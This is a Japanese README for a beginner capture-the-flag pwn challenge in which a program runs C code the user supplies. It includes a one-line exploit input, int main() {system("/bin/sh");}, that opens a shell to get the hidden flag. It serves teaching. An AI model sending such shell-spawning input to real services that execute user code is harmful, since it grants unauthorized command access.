# begineers_shell
![Genre: Pwn](https://img.shields.io/badge/genre-pwn-brightgreen?style=for-the-badge)
![Author: iwancof](https://img.shields.io/badge/author-iwancof-lightgrey?style=for-the-badge)

C言語を勉強中の「彼」はみんなが教えてくれたプログラムを実行するのが好きみたい！でも彼には秘密があって...。どうにかして秘密の flag を聞き出せないかな？

## Files
- main.c
- Makefile

## Run
```
$ make
$ ./beginners_shell
```

## exploit
```
$ ./beginners_shell
int main() {system("/bin/sh");}
```

## writeup
やるだけ

## Comment
pwn初心者向け
このジャンルの問題で、何をすればゴールなのかを提示するみたいな感じ。
